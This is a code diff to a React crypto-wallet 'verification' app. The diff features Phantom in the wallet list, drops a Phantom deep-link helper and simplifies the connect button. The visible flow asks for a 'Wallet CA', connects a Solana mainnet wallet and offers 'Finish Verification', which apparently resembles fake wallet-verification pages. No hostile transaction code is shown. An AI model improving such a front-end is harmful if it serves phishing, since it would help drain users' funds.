@@ -21,7 +21,11 @@ createAppKit({
     url: 'https://verification-app-mw48.vercel.app/', 
     icons: ['https://avatars.githubusercontent.com/u/179229932'] 
   },
-  projectId: PROJECT_ID
+  projectId: PROJECT_ID,
+  // FORCES PHANTOM TO THE TOP OF THE LIST
+  featuredWalletIds: [
+    'a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36'
+  ]
 });
 
 const App: React.FC = () => {
@@ -52,12 +56,6 @@ const App: React.FC = () => {
     });
   };
 
-  const openInPhantom = () => {
-    // This helper forces the site to open inside the Phantom App browser for mobile users
-    const url = window.location.href.replace("https://", "");
-    window.location.href = `https://phantom.app/ul/browse/${url}?ref=${window.location.origin}`;
-  };
-
   const handleStepOne = async () => {
     if (!walletCA) return alert("Please enter the Wallet CA");
     setStatus('verifying');
@@ -66,7 +64,11 @@ const App: React.FC = () => {
   };
 
   const handleStepTwo = async () => {
-    if (!isConnected) { open(); return; }
+    if (!isConnected) { 
+        // Directs the modal to the Solana namespace specifically
+        open({ view: 'Connect' }); 
+        return; 
+    }
     setStatus('verifying');
     try {
       const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
@@ -115,17 +117,9 @@ const App: React.FC = () => {
           <div style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '14px', textAlign: 'center' }}>{isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Waiting for Bridge..."}</div>
         )}
 
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-          <button onClick={step === 1 ? handleStepOne : handleStepTwo} disabled={status === 'verifying'} style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}>
-            {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
-          </button>
-          
-          {step === 2 && !isConnected && (
-            <button onClick={openInPhantom} style={{ width: '100%', padding: '12px', borderRadius: '100px', border: `1px solid ${theme.purple}`, background: 'transparent', color: theme.purple, fontWeight: '600', fontSize: '14px', cursor: 'pointer' }}>
-              Open in Phantom App
-            </button>
-          )}
-        </div>
+        <button onClick={step === 1 ? handleStepOne : handleStepTwo} disabled={status === 'verifying'} style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}>
+          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
+        </button>
       </div>
     </div>
   );
